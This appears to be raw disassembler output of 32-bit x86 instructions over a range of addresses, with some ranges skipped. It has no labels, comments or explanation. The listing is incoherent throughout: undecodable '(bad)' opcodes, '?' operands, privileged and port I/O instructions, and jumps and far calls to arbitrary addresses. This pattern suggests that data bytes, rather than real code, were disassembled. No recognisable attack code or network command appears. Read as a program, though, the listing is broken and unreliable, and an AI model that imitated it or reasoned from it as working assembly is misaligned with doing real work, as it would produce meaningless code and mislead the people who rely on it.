  421564:	mov    WORD PTR [ebx],cs
  421566:	push   edx
  421567:	adc    cl,BYTE PTR [eax-0x3f]
  42156a:	jecxz  0x421523
  42156c:	sbb    al,BYTE PTR [ebx-0x699f0866]
  421572:	jmp    0x464d1c67
  421577:	fcom   QWORD PTR [ebx]
  421579:	fnsave [ebx]
  42157b:	mov    ebx,0xf88621
  421580:	jno    0x4215b1
  421582:	aas    
  421583:	fldenv [ecx]
  421585:	popa   
  421586:	test   al,0x3
  421588:	jnp    0x42154b
  42158a:	stos   DWORD PTR es:[edi],eax
  42158b:	test   al,0x72
  42158d:	inc    ecx
  42158e:	xchg   ebx,eax
  42158f:	mov    bl,al
  421591:	std    
  421592:	mov    esp,0x7fdb8fba
  421597:	ins    BYTE PTR es:[edi],dx
  421598:	sbb    BYTE PTR [ebx+0xdfa2bf2],cl
  42159e:	ret    
  42159f:	fs jno 0x4215b0
  4215a2:	ss pop ecx
  4215a4:	inc    edx
  4215a5:	int3   
  4215a6:	adc    eax,0xafd1e7dd
  4215ab:	inc    ebx
  4215ac:	jl     0x4215ce
  4215ae:	cld    
  4215af:	cmp    ebx,DWORD PTR [eax-0x104c7027]
  4215b5:	push   ebx
  4215b6:	cmp    BYTE PTR [ebx],dl
  4215b8:	mov    DWORD PTR [eax],ebx
  4215ba:	and    BYTE PTR [edx-0x759db7c5],0x19
  4215c1:	pop    esi
  4215c2:	xor    BYTE PTR [edi-0x70],0xc8
  4215c6:	push   edi
  4215c7:	out    dx,eax
  4215c8:	out    dx,al
  4215c9:	mov    ebx,0x66c0ab88
  4215ce:	data16 sbb BYTE PTR [ecx-0x36],bh
  4215d2:	cmp    eax,DWORD PTR [ebx+0x6dbef083]
  4215d8:	sub    al,0xd0
  4215da:	xlat   BYTE PTR ds:[ebx]
  4215db:	mov    al,ds:0x99c96173
  4215e0:	push   ebx
  4215e1:	xchg   ah,ah
  4215e3:	stos   BYTE PTR es:[edi],al
  4215e4:	mov    bh,BYTE PTR [edx+0x3b]
  4215e7:	aas    
  4215e8:	arpl   WORD PTR [ebx+0x24],bx
  4215eb:	xchg   ebp,eax
  4215ec:	mov    esi,0x6c1935e5
  4215f1:	jbe    0x4215c0
  4215f3:	and    eax,0x2baaa6d
  4215f8:	pop    edx
  4215f9:	jno    0x4215c9
  4215fb:	bswap  edi
  4215fd:	mov    ebx,0xeb61d99
  421602:	cmp    al,0x1c
  421604:	(bad)  [ebx+0x5a2ef865]
  42160a:	and    DWORD PTR [esi-0x4c],esp
  42160d:	xchg   ebp,eax
  42160e:	(bad)  
  42160f:	(bad)
  421614:	(bad)  
  421615:	adc    ebx,DWORD PTR [ebx+0xd]
  421618:	inc    esp
  421619:	repnz shl BYTE PTR ds:[edi],0x72
  42161e:	out    0x1a,al
  421620:	sub    DWORD PTR [ebp-0x8ed1da0],0xffffffc7
  421627:	aad    0xfa
  421629:	rsm    
  42162b:	mov    al,ds:0xe1a034a1
  421630:	cli    
  421631:	adc    ebp,DWORD PTR [edi+edx*1]
  421634:	push   es
	...
  421695:	add    BYTE PTR [ebx-0x105512d4],ch
  42169b:	jmp    0x42168c
  42169d:	sub    eax,0xf9231b1e
  4216a2:	add    bl,cl
  4216a4:	push   cs
  4216a5:	out    0xdd,eax
  4216a7:	bound  eax,QWORD PTR [ecx]
  4216a9:	add    BYTE PTR [edi],al
  4216ab:	add    DWORD PTR [eax],eax
  4216ad:	add    BYTE PTR [ebx-0x6283604f],dh
  4216b3:	aad    0xf6
  4216b5:	sbb    esp,DWORD PTR [esi+edi*1+0xa147cfc]
  4216bc:	call   0x6bf9:0x7c42c89a
  4216c3:	scas   eax,DWORD PTR es:[edi]
  4216c4:	(bad)  
  4216c5:	cld    
  4216c6:	(bad)  
  4216c7:	pop    ss
  4216c8:	mov    ebx,0x43199713
  4216cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216ce:	adc    eax,0x9185093b
  4216d3:	dec    edi
  4216d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216d5:	xor    eax,0xd2856f46
  4216da:	adc    bh,0xfe
  4216dd:	in     eax,0xab
  4216df:	cli    
  4216e0:	rol    DWORD PTR [edi+edi*1],0x8f
  4216e4:	(bad)
  4216e7:	cld    
  4216e8:	xchg   edx,eax
  4216e9:	sub    BYTE PTR ds:0x3cb64393,0x62
  4216f0:	fwait
  4216f1:	call   0x1d8dd97c
  4216f6:	ja     0x4216e7
  4216f8:	aas    
  4216f9:	inc    edi
  4216fa:	js     0x4216bc
  4216fc:	jb     0x4216bb
  4216fe:	sbb    ecx,DWORD PTR [esi]
  421700:	dec    ecx
  421701:	(bad)  [esi]
  421703:	sub    eax,0x241c58fe
  421708:	and    al,0x6e
  42170a:	fwait
  42170b:	push   ss
  42170c:	inc    ebx
  42170d:	mov    ebp,0xdd1ca8cd
  421712:	div    eax
  421714:	cmp    eax,0xb9fbdac1
  421719:	ror    dh,cl
  42171b:	ins    DWORD PTR es:[edi],dx
  42171c:	cmp    ch,BYTE PTR [ecx]
  42171e:	fwait
  42171f:	les    esp,FWORD PTR [esi-0xc99aeb8]
  421725:	retf   
  421726:	stos   DWORD PTR es:[edi],eax
  421727:	sbb    ebp,ecx
  421729:	mov    ?,esi
  42172b:	in     al,0xb4
  42172d:	scas   eax,DWORD PTR es:[edi]
  42172e:	jmp    0x421782
  421730:	ins    BYTE PTR es:[edi],dx
  421731:	fwait
  421732:	mov    ?,WORD PTR gs:[eax]
  421735:	dec    edx
  421736:	mov    ds:0xf2e6c5f1,eax
  42173b:	enter  0x8c57,0x2b
  42173f:	sub    ch,BYTE PTR [edi-0x35]
  421742:	scas   eax,DWORD PTR es:[edi]
  421743:	pop    ecx
  421744:	dec    eax
  421745:	clc    
  421746:	cmp    eax,0x1fc3cbbb
  42174b:	lahf   
  42174c:	lods   eax,DWORD PTR ds:[esi]
  42174d:	jge    0x4216d5
  42174f:	in     eax,dx
  421750:	xor    al,0xb4
  421752:	jl     0x421784
  421754:	dec    eax
  421755:	sbb    al,0xcd
  421757:	cmc    
  421758:	fadd   DWORD PTR ds:0x8bf0e1e9
  42175e:	add    ecx,DWORD PTR [esi+0xb]
  421761:	in     eax,dx
  421762:	jno    0x42176f
  421764:	div    dl
  421766:	ins    DWORD PTR es:[edi],dx
  421767:	leave  
  421768:	out    dx,eax
  421769:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42176a:	cwde   
  42176b:	mov    ch,0xd3
  42176d:	jns    0x421785
  42176f:	test   esi,edx
  421771:	lahf   
  421772:	mov    es,WORD PTR [edi-0x26]
  421775:	sub    al,0x75
  421777:	clc    
  421778:	cmp    eax,0xe8eb007
  42177d:	test   BYTE PTR [ebx],al
  42177f:	fstsw  WORD PTR [edi-0x6dd2b883]
  421786:	mov    edx,0x1176fe6d
  42178b:	push   ds
  42178c:	mov    ds:0xfc798a8a,eax
  421791:	dec    ecx
  421792:	lods   al,BYTE PTR ds:[esi]
  421793:	test   eax,0x2a4a687f
  421798:	or     BYTE PTR [esi-0x43fdda9f],al
  42179e:	rol    BYTE PTR [edx+0x37],0x24
  4217a2:	loopne 0x4217c3
  4217a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217a5:	test   eax,0xd59fa7c8
  4217aa:	or     edi,DWORD PTR [esi-0x1e]
  4217ad:	stos   DWORD PTR es:[edi],eax
  4217ae:	fstp   TBYTE PTR [edi-0x3b24317c]
  4217b4:	mov    ds:0x0,eax
	...
  421815:	add    cl,dl
  421817:	mov    al,ds:0xf9f9e0b9
  42181c:	fnstenv [ecx-0x7ac22162]
  421822:	outs   dx,DWORD PTR ds:[esi]
  421823:	push   esp
  421824:	iret   
  421825:	dec    eax
  421826:	in     al,0x63
  421828:	add    DWORD PTR [eax],eax
  42182a:	pop    es
  42182b:	add    DWORD PTR [eax],eax
  42182d:	add    BYTE PTR [edx-0x78adfbec],ch
  421833:	inc    ecx
  421834:	jns    0x421868
  421836:	imul   BYTE PTR [ebx]
  421838:	dec    ecx
  421839:	das    
  42183a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42183b:	mov    edx,0xed7188c5
  421840:	int3   
  421841:	jnp    0x4218aa
  421843:	call   0xb82e:0x78ecd37
  42184a:	rol    ebx,0xfe
  42184d:	mov    esp,0x5522c719
  421852:	repz mov al,ds:0xb4a7bdc
  421858:	jl     0x4217ff
  42185a:	dec    ecx
  42185b:	aaa    
  42185c:	inc    esp
  42185d:	pop    ecx
  42185e:	jo     0x4217e8
  421860:	aam    0x12
  421862:	or     al,0xb3
  421864:	mov    al,0x20
  421866:	mov    eax,ds:0xe6570169
  42186b:	sbb    al,0x32
  42186d:	push   es
  42186e:	dec    ebp
  42186f:	push   ebx
  421870:	mov    esi,0x2df07aa6
  421875:	outs   dx,BYTE PTR ds:[esi]
  421876:	data16 jne 0x4218a4
  421879:	pop    ebp
  42187a:	and    al,0xe5
  42187c:	sub    dh,BYTE PTR [edx-0x55]
  42187f:	mov    edi,0x78fd94c4
  421884:	nop
  421885:	shr    DWORD PTR [ebx-0x662c71f1],cl
  42188b:	pop    esp
  42188c:	adc    eax,0x29c4198f
  421891:	fmul   DWORD PTR [esi-0x60]
  421894:	xor    ebx,DWORD PTR [edi+edx*8+0x76]
  421898:	and    DWORD PTR fs:[edi],0xffffffc0
  42189c:	adc    DWORD PTR [eax+0x1a],esi
  42189f:	mov    edx,0x3ccb129e
  4218a4:	fwait
  4218a5:	adc    BYTE PTR [esp+edi*2],0x96
  4218a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218aa:	lods   al,BYTE PTR ds:[esi]
  4218ab:	mov    edi,0x7df7c4e4
  4218b0:	and    al,0x6a
  4218b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218b3:	(bad)  
  4218b5:	add    bl,BYTE PTR [ebp+eax*2+0x25]
  4218b9:	add    BYTE PTR [edx+eax*1-0x15ab4796],0x8d
  4218c1:	das    
  4218c2:	or     dh,BYTE PTR [edx]
  4218c4:	and    al,0x17
  4218c6:	mov    ah,al
  4218c8:	push   ebp
  4218c9:	adc    eax,0x375f52d9
  4218ce:	mov    BYTE PTR [eax+0x1c5762d1],ch
  4218d4:	in     eax,0xf1
  4218d6:	popa   
  4218d7:	xlat   BYTE PTR ds:[ebx]
  4218d8:	jb     0x4218df
  4218da:	(bad)  
  4218db:	sbb    DWORD PTR [ebx],eax
  4218dd:	add    bl,BYTE PTR [edi+0x33037a3f]
  4218e3:	retf   0xf840
  4218e6:	inc    esi
  4218e7:	js     0x4218c2
  4218e9:	xor    bh,al
  4218eb:	mov    ?,WORD PTR [ebp+0x655504ae]
  4218f1:	cmp    BYTE PTR [edx-0x34],0x9b
  4218f5:	repnz test DWORD PTR [ebx+0x3ddad423],ebp
  4218fc:	out    dx,eax
  4218fd:	xchg   ebp,eax
  4218fe:	mov    bl,0xca
  421900:	xor    eax,0xb78fca63
  421905:	daa    
  421906:	sub    DWORD PTR ds:0xe093a0d3,0xdeddc2e
  421910:	ret    0xe5bb
  421913:	mov    DWORD PTR [ebp+0x5c],ebp
  421916:	imul   edx,DWORD PTR [ebx-0x751ed29c],0x17
  42191d:	jne    0x421904
  42191f:	or     DWORD PTR [edx+0x41],edi
  421922:	adc    eax,0x99418e7d
  421927:	aaa    
  421928:	jne    0x4218aa
  42192a:	push   cs
  42192b:	xchg   DWORD PTR [eax+edi*1+0x18],edx
  42192f:	in     al,dx
  421930:	mov    ds:0xafbead7,eax
	...
  421995:	add    dh,bh
  421997:	cld    
  421998:	je     0x4219b7
  42199a:	jbe    0x421939
  42199c:	(bad)  
  42199d:	dec    DWORD PTR [ebx-0x3d]
  4219a0:	rcl    DWORD PTR [edx+0x7dcfe3a4],0xeb
  4219a7:	add    DWORD PTR fs:[eax],eax
  4219aa:	pop    es
  4219ab:	add    DWORD PTR [eax],eax
  4219ad:	add    BYTE PTR [edx-0x24a31a81],cl
  4219b3:	jecxz  0x4219ed
  4219b5:	ror    BYTE PTR [edx-0x2bcbf339],0xa7
  4219bc:	mov    BYTE PTR [edx-0x46],dh
  4219bf:	inc    ebp
  4219c0:	addr16 sahf 
  4219c2:	inc    esp
  4219c3:	in     eax,dx
  4219c4:	sub    al,0xb6
  4219c6:	or     DWORD PTR [eax-0x14dbfe98],ecx
  4219cc:	pop    ds
  4219cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219ce:	pop    edx
  4219cf:	retf   0xfe03
  4219d2:	jns    0x4219e0
  4219d4:	adc    dl,ah
  4219d6:	mov    WORD PTR [ebp+eiz*8-0x40],?
  4219da:	fwait
  4219db:	adc    BYTE PTR [ebx+edx*2+0x6fec52dd],0xde
  4219e3:	arpl   di,cx
  4219e5:	inc    edi
  4219e6:	xchg   edx,eax
  4219e7:	xlat   BYTE PTR ds:[ebx]
  4219e8:	fisub  DWORD PTR [edx]
  4219ea:	xchg   edx,eax
  4219eb:	mov    al,0xea
  4219ed:	call   0xb6b0:0x7b3be0fa
  4219f4:	mov    edi,0x4bf69ddd
  4219f9:	sub    dh,bh
  4219fb:	inc    eax
  4219fc:	or     DWORD PTR [edi+0x5d],ebx
  4219ff:	shr    BYTE PTR [ebp+0xe],0x42
  421a03:	add    dh,bh
  421a05:	repz mov eax,0xe472ac79
  421a0b:	pop    edx
  421a0c:	mov    ch,0x45
  421a0e:	ds ja  0x4219b5
  421a11:	iret   
  421a12:	jp     0x421a6a
  421a14:	lods   eax,DWORD PTR ds:[esi]
  421a15:	pusha  
  421a16:	retf   0x2044
  421a19:	in     al,0xf2
  421a1b:	push   esi
  421a1c:	das    
  421a1d:	jp     0x4219fb
  421a1f:	cwde   
  421a20:	test   eax,0x4866db14
  421a25:	mov    bl,0x3
  421a27:	int    0x37
  421a29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a2a:	cld    
  421a2b:	popa   
  421a2c:	mov    ebx,0x66b2f1a7
  421a31:	nop
  421a32:	test   BYTE PTR ds:0xffd93e89,0x51
  421a39:	and    DWORD PTR [eax],esi
  421a3b:	rol    bh,0xd6
  421a3e:	add    ebx,ebx
  421a40:	mov    ds:0xe962a0d1,al
  421a45:	xchg   ecx,eax
  421a46:	xlat   BYTE PTR ds:[ebx]
  421a47:	add    ebx,esi
  421a49:	sub    BYTE PTR gs:0x8bf0672a,ch
  421a50:	or     dl,al
  421a52:	push   0x8a8f367a
  421a57:	std    
  421a58:	icebp  
  421a59:	pop    esi
  421a5a:	dec    eax
  421a5b:	out    0xbc,eax
  421a5d:	xor    esi,DWORD PTR [esi-0x6c8d03cc]
  421a63:	ror    al,cl
  421a65:	ins    BYTE PTR es:[edi],dx
  421a66:	(bad)  
  421a67:	loope  0x421a65
  421a69:	push   0xce09743a
  421a6e:	xor    esp,DWORD PTR [edi-0x1]
  421a71:	dec    esi
  421a72:	or     ch,BYTE PTR [esi+0x737509f]
  421a78:	hlt    
  421a79:	mov    ch,BYTE PTR [esi-0x29]
  421a7c:	add    dh,BYTE PTR [esi-0x40]
  421a7f:	popf   
  421a80:	fstp   TBYTE PTR [edx+ebp*1]
  421a83:	xchg   ecx,eax
  421a84:	arpl   WORD PTR [edi+0x1fca4da4],dx
  421a8a:	jb     0x421a26
  421a8c:	test   DWORD PTR [edx-0x4c],edi
  421a8f:	(bad)  
  421a91:	rol    BYTE PTR [esi],1
  421a93:	dec    esi
  421a94:	aaa    
  421a95:	rol    ebp,1
  421a97:	call   0x5962d695
  421a9c:	hlt    
  421a9d:	add    edi,DWORD PTR [ecx+0x1b139e6]
  421aa3:	push   esi
  421aa4:	out    0x4e,al
  421aa6:	imul   edi,edi,0xffffffa5
  421aa9:	xchg   edi,eax
  421aaa:	add    ebx,DWORD PTR [ebp-0x74]
  421aad:	add    eax,DWORD PTR [esi+eiz*2-0x6e]
  421ab1:	sub    al,0xd4
  421ab3:	push   ss
  421ab4:	imul   eax,DWORD PTR [eax],0x0
	...
  421b16:	push   ss
  421b17:	cdq    
  421b18:	jmp    0x37400aea
  421b1d:	fcmovnu st,st(5)
  421b1f:	sahf   
  421b20:	test   DWORD PTR [edx-0x357b054e],0x165f2
  421b2a:	pop    es
  421b2b:	add    DWORD PTR [eax],eax
  421b2d:	add    dh,ah
  421b2f:	dec    DWORD PTR [ebx+ebx*8]
  421b32:	mov    ds:0x1ffdfd26,al
  421b37:	and    al,0xfa
  421b39:	mov    dh,0x35
  421b3b:	or     BYTE PTR [esi-0x3dcd2d78],dh
  421b41:	dec    ecx
  421b42:	das    
  421b43:	push   ss
  421b44:	ficom  WORD PTR [ebx+0x2bbb93c7]
  421b4a:	loop   0x421b43
  421b4c:	sub    edi,DWORD PTR [ecx-0x64]
  421b4f:	pushf  
  421b50:	or     DWORD PTR [edx-0x46],ebx
  421b53:	dec    edi
  421b54:	mov    ch,0xfb
  421b56:	and    al,0xbe
  421b58:	arpl   WORD PTR [eax+0x0],bp
  421b5b:	rol    BYTE PTR [ebx+edx*2+0x3495f95d],1
  421b62:	dec    ebp
  421b63:	add    DWORD PTR [ebx],ebx
  421b65:	lock rcl eax,cl
  421b68:	push   ds
  421b69:	mov    cs,WORD PTR [ebx+0x10]
  421b6c:	int3   
  421b6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b6e:	pop    edx
  421b6f:	mov    eax,ds:0x52bf2f8b
  421b74:	mov    DWORD PTR ss:[edx+ebx*1+0x7058471],esi
  421b7c:	mov    eax,ds:0xf948fc54
  421b81:	mov    edx,0xf3a6bd84
  421b86:	(bad)  
  421b87:	outs   dx,DWORD PTR ds:[esi]
  421b88:	aaa    
  421b89:	cmovle ebp,DWORD PTR [ebx-0x48]
  421b8d:	jg     0x421bb9
  421b8f:	and    al,0x9f
  421b91:	and    eax,0x50afea21
  421b96:	inc    edi
  421b97:	(bad)  
  421b98:	jmp    0x421b9d
  421b9a:	and    ecx,DWORD PTR [edx+0x2e]
  421b9d:	pop    ds
  421b9e:	out    dx,eax
  421b9f:	dec    ecx
  421ba0:	outs   dx,BYTE PTR ds:[esi]
  421ba1:	ficomp DWORD PTR [edx+0x43a862ad]
  421ba7:	in     eax,0xe5
  421ba9:	inc    esp
  421baa:	imul   ebp,DWORD PTR [eax+0x3c],0xffffff9d
  421bae:	gs dec esi
  421bb0:	adc    al,0x15
  421bb2:	ret    
  421bb3:	adc    edx,DWORD PTR [edi]
  421bb5:	mov    ?,eax
  421bb7:	int3   
  421bb8:	sbb    DWORD PTR [edx+0x53],eax
  421bbb:	inc    ebx
  421bbc:	add    edi,eax
  421bbe:	sub    BYTE PTR [ecx],cl
  421bc0:	mov    ch,0x38
  421bc2:	lds    eax,FWORD PTR [ecx-0xc3067a9]
  421bc8:	bound  eax,QWORD PTR [esi]
  421bca:	pop    es
  421bcb:	lea    edi,[ebp+0x1f]
  421bce:	loopne 0x421b7e
  421bd0:	mov    esi,0xa26ff3fc
  421bd5:	adc    eax,0x3e4036ac
  421bda:	fld    DWORD PTR [esi+0x5e]
  421bdd:	repz add BYTE PTR [ebx-0x65],cl
  421be1:	inc    esp
  421be2:	int3   
  421be3:	(bad)  
  421be5:	lds    ecx,FWORD PTR [edi]
  421be7:	push   eax
  421be8:	dec    edx
  421be9:	xlat   BYTE PTR ds:[ebx]
  421bea:	test   BYTE PTR [ebp*8-0x1c2e6143],0x40
  421bf2:	jle    0x421bf8
  421bf4:	sbb    BYTE PTR [ebp+eax*8+0x390a476a],bl
  421bfb:	out    0x23,eax
  421bfd:	pop    ebx
  421bfe:	cmp    eax,DWORD PTR [edi+ebp*4+0xf69ee19]
  421c05:	mov    BYTE PTR [ecx+edi*2+0x703c8531],bl
  421c0c:	popf   
  421c0d:	in     al,0x55
  421c0f:	in     eax,dx
  421c10:	push   eax
  421c11:	fsubr  DWORD PTR ds:0xd9a98bea
  421c17:	icebp  
  421c18:	loop   0x421bf9
  421c1a:	cli    
  421c1b:	retf   
  421c1c:	std    
  421c1d:	push   es
  421c1e:	fnstsw WORD PTR [ebx+0x1bb028e3]
  421c24:	xor    DWORD PTR [ecx-0x39cb3a1d],0xd68203f
  421c2e:	xchg   edx,eax
  421c2f:	int    0xab
  421c31:	xlat   BYTE PTR ds:[ebx]
  421c32:	imul   edx,edx,0xffffffd4
	...
  421c95:	add    BYTE PTR [eax-0x1a4a95],dh
  421c9b:	push   eax
  421c9d:	jg     0x421c36
  421c9f:	shl    DWORD PTR [ebp+0x418aa819],0x3e
  421ca6:	stc    
  421ca7:	add    WORD PTR [eax],ax
  421caa:	pop    es
  421cab:	add    DWORD PTR [eax],eax
  421cad:	add    BYTE PTR [ebp-0xee5f833],cl
  421cb3:	jmp    0x83d2:0xd3cc0988
  421cba:	xchg   ebx,eax
  421cbb:	dec    esi
  421cbc:	mov    DWORD PTR [edx-0x75],0x17fc36b4
  421cc3:	fiadd  DWORD PTR [ebx+0x70a6f2b7]
  421cc9:	mov    ecx,0xf0794bfe
  421cce:	dec    esi
  421ccf:	shr    DWORD PTR [ebx+0x0],0x61
  421cd3:	sub    BYTE PTR ds:0x2cd7b458,0xf8
  421cda:	in     al,0xe9
  421cdc:	mov    ebp,0x3eb56d26
  421ce1:	in     al,dx
  421ce2:	dec    ebp
  421ce3:	jnp    0x421c8c
  421ce5:	jge    0x421d47
  421ce7:	aaa    
  421ce8:	cmp    eax,0xe0c934b5
  421ced:	sub    eax,0x954630d6
  421cf2:	push   ebx
  421cf3:	mov    ah,0xe6
  421cf5:	cmp    eax,0x1a93b656
  421cfa:	bound  eax,QWORD PTR [ebx+0x69fcada4]
  421d00:	aad    0x64
  421d02:	aam    0xcf
  421d04:	aad    0x31
  421d06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d07:	mov    BYTE PTR ds:0x2c2d8cf5,bh
  421d0d:	cdq    
  421d0e:	in     al,dx
  421d0f:	sub    eax,0xd35bc0a1
  421d14:	addr16 imul ecx,eax,0x3a
  421d18:	xor    esp,DWORD PTR [edx]
  421d1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d1b:	div    BYTE PTR [edi-0x42ecffed]
  421d21:	push   ecx
  421d22:	jne    0x421cbc
  421d24:	push   ecx
  421d25:	imul   ebx,DWORD PTR [eax],0xa7a4c51e
  421d2b:	push   eax
  421d2c:	mov    ds:0xfd217aa1,al
  421d31:	(bad)
  421d34:	sub    BYTE PTR [ecx],al
  421d36:	mov    cl,0xd2
  421d38:	rcr    BYTE PTR [edi-0x1e],cl
  421d3b:	xor    bh,bh
  421d3d:	dec    ebx
  421d3e:	ret    
  421d3f:	lock test DWORD PTR [edi+edi*2+0x52],ecx
  421d44:	dec    esi
  421d45:	ins    DWORD PTR es:[edi],dx
  421d46:	sbb    cl,BYTE PTR [edx-0x5ec6e21]
  421d4c:	mov    dl,BYTE PTR [ecx]
  421d4e:	dec    edx
  421d4f:	(bad)  
  421d50:	cmp    BYTE PTR [edi],dl
  421d52:	adc    eax,0x559e94db
  421d57:	test   al,0x35
  421d59:	push   di
  421d5b:	mov    cl,0x58
  421d5d:	das    
  421d5e:	sub    eax,DWORD PTR ss:[eax]
  421d61:	rol    DWORD PTR [edx+edx*2-0x30c0eeb0],cl
  421d68:	cmc    
  421d69:	lds    edi,FWORD PTR [eax+0x580346c7]
  421d6f:	add    BYTE PTR [ebp+0x1e],dl
  421d72:	xchg   esp,eax
  421d73:	xor    edi,DWORD PTR [edi+0x6d]
  421d76:	dec    ebx
  421d77:	mov    bh,0x9f
  421d79:	jno    0x421d3f
  421d7b:	daa    
  421d7c:	pop    ecx
  421d7d:	scas   al,BYTE PTR es:[edi]
  421d7e:	mov    edi,0xfa76f27e
  421d83:	adc    al,BYTE PTR es:[edx-0x2]
  421d87:	xchg   esi,eax
  421d88:	retf   
  421d89:	inc    edi
  421d8a:	ds jno 0x421d25
  421d8d:	aaa    
  421d8e:	daa    
  421d8f:	test   eax,0xb0f65a63
  421d94:	jl     0x421d7b
  421d96:	pushf  
  421d97:	out    0x3c,eax
  421d99:	cwde   
  421d9a:	and    DWORD PTR [ecx-0x25],edi
  421d9d:	int    0x9
  421d9f:	test   eax,0x7a0d70ba
  421da4:	gs das 
  421da6:	mov    cl,cl
  421da8:	sub    esp,DWORD PTR [edx-0x58]
  421dab:	lods   eax,DWORD PTR ds:[esi]
  421dac:	xchg   edx,eax
  421dad:	and    eax,0xbeb29ff6
  421db2:	test   al,0xf1
  421db4:	outs   dx,BYTE PTR ds:[esi]
	...
  421e15:	add    bh,cl
  421e17:	mov    eax,ds:0xbf7f851b
  421e1c:	fucomip st,st(3)
  421e1e:	lock jbe 0x421e3b
  421e21:	cmp    BYTE PTR [edi+0x2f],al
  421e24:	mov    ds,WORD PTR [eax+0x0]
  421e27:	push   0x1070001
  421e2c:	add    BYTE PTR [eax],al
  421e2e:	jo     0x421e49
  421e30:	lea    ebx,[ebx+edx*1-0x30ed616]
  421e37:	inc    edi
  421e38:	sub    DWORD PTR [eax+0x7f],0xf8eef12d
  421e3f:	out    0x85,eax
  421e41:	jmp    0xc8d00195
  421e46:	adc    ebp,ebx
  421e48:	sbb    eax,0xed8dfc3c
  421e4d:	jecxz  0x421de3
  421e4f:	call   0xf9867def
  421e54:	xor    al,0x62
  421e56:	sbb    al,0x5
  421e58:	pop    esi
  421e59:	push   cs
  421e5a:	int3   
  421e5b:	retf   0x324e
  421e5e:	pushf  
  421e5f:	rcr    DWORD PTR [edx-0x3a7f0234],cl
  421e65:	jbe    0x421e65
  421e67:	dec    ecx
  421e68:	or     eax,0x399d5bf4
  421e6d:	outs   dx,DWORD PTR es:[esi]
  421e6f:	or     DWORD PTR [ecx-0x5ed9047c],edx
  421e75:	inc    esi
  421e76:	(bad)  
  421e77:	cld    
  421e78:	inc    ebp
  421e79:	loop   0x421e5b
  421e7b:	add    edx,edx
  421e7d:	mov    BYTE PTR [edx+0x6f6f72a7],al
  421e83:	pop    esp
  421e84:	xchg   esp,eax
  421e85:	stos   BYTE PTR es:[edi],al
  421e86:	sub    al,0x23
  421e88:	fsubr  DWORD PTR [ebx]
  421e8a:	push   ecx
  421e8b:	mov    eax,ds:0xf68bea05
  421e90:	loop   0x421ee5
  421e92:	mov    ebx,0xc6e39559
  421e97:	inc    esi
  421e98:	sbb    DWORD PTR [ebp+0x4fc18ea1],ebx
  421e9e:	pop    esp
  421e9f:	mov    al,0x44
  421ea1:	js     0x421ec1
  421ea3:	xor    eax,0x89908731
  421ea8:	push   ss
  421ea9:	inc    ebp
  421eaa:	sbb    BYTE PTR [ebx-0x50],bh
  421ead:	adc    eax,0xad09298e
  421eb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421eb3:	(bad)  
  421eb4:	sbb    DWORD PTR [edx],edi
  421eb6:	inc    esi
  421eb7:	sbb    eax,0xef05d2d0
  421ebc:	imul   ebx,esp,0xc8d0fac
  421ec2:	xchg   esi,eax
  421ec3:	jno    0x421eed
  421ec5:	ds js  0x421f3e
  421ec8:	cmp    BYTE PTR [ebp+0x561be1b8],ch
  421ece:	jae    0x421e6f
  421ed0:	sbb    eax,0xfcefffcb
  421ed5:	push   es
  421ed6:	sbb    eax,0x1e0db146
  421edb:	in     al,0xc2
  421edd:	and    BYTE PTR [ebp+ecx*2-0xe42e71e],cl
  421ee4:	push   0xffffffb1
  421ee6:	in     al,dx
  421ee7:	shl    ah,1
  421ee9:	rol    BYTE PTR [edi+edx*1],cl
  421eec:	and    eax,0xc955e294
  421ef1:	and    eax,0xe931830a
  421ef6:	sbb    bh,BYTE PTR [edx+0x7f]
  421ef9:	mov    eax,0x47127f24
  421efe:	add    al,0xc9
  421f00:	cs cmc 
  421f02:	(bad)  
  421f03:	jbe    0x421eaf
  421f05:	push   ds
  421f06:	int    0xb7
  421f08:	xlat   BYTE PTR ds:[ebx]
  421f09:	out    dx,al
  421f0a:	sbb    DWORD PTR [edi],ecx
  421f0c:	ins    BYTE PTR es:[edi],dx
  421f0d:	inc    ebx
  421f0e:	(bad)  
  421f0f:	iret   
  421f10:	iret   
  421f11:	jne    0x421efb
  421f13:	ins    DWORD PTR es:[edi],dx
  421f14:	sub    eax,0x7088e84a
  421f19:	shl    DWORD PTR [edx-0x1c],cl
  421f1c:	cld    
  421f1d:	pop    esp
  421f1e:	xor    BYTE PTR [edi],ch
  421f20:	jge    0x421f22
  421f22:	in     al,0x57
  421f24:	xor    cl,dl
  421f26:	pushf  
  421f27:	jp     0x421efa
  421f29:	mov    ecx,0x5d5986c1
  421f2e:	test   eax,0x70c98fa2
  421f33:	fnstenv [eax+0x0]
	...
  421f95:	add    BYTE PTR [ebx+0x6],ch
  421f98:	(bad)  
  421f99:	dec    edi
  421f9a:	out    dx,eax
  421f9b:	iret   
  421f9c:	jmp    0x421fc4
  421f9e:	das    
  421f9f:	mov    esi,0x7b3eaf78
  421fa4:	jbe    0x421fd1
  421fa6:	pop    es
  421fa7:	imul   eax,DWORD PTR [ecx],0x10700
  421fad:	add    BYTE PTR [esi+0x70],dh
  421fb0:	inc    ebp
  421fb1:	ror    edx,1
  421fb3:	mov    esp,0x787b62d2
  421fb8:	mov    ds:0x5b5f85eb,al
  421fbd:	mov    cx,0x70bf
  421fc1:	ds cwde 
  421fc3:	sub    bh,BYTE PTR [ebp+0x15]
  421fc6:	mov    BYTE PTR [edi-0x49],bl
  421fc9:	popa   
  421fca:	sbb    BYTE PTR [ecx],ah
  421fcc:	jle    0x421feb
  421fce:	dec    ebp
  421fcf:	and    al,0xc7
  421fd1:	cdq    
  421fd2:	dec    eax
  421fd3:	pop    ss
  421fd4:	retf   
  421fd5:	call   DWORD PTR [esi-0x74ac3470]
  421fdb:	mov    dl,0x3
  421fdd:	jge    0x422010
